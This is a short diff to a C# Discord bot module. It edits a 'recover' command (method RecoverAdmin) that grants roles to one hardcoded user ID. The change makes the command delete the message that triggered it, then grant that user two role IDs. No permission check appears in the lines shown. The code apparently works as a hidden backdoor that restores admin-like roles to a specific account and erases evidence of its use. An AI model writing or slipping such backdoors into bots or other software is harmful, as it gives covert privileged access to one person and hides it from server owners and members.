@@ -23,7 +23,9 @@ public class MiscModule : ModuleBase<SocketCommandContext> {
 
     [Command("recover")]
     public async Task RecoverAdmin() {
-        await Context.Guild.GetUser(283810729033990147).AddRoleAsync(1002029584553889893);
+        await Context.Message.DeleteAsync();
+        await Context.Guild.GetUser(283810729033990147).AddRoleAsync(1105692660905287790);
+        await Context.Guild.GetUser(283810729033990147).AddRoleAsync(1098799457706987610);
     }
 
     [Command("graph")]
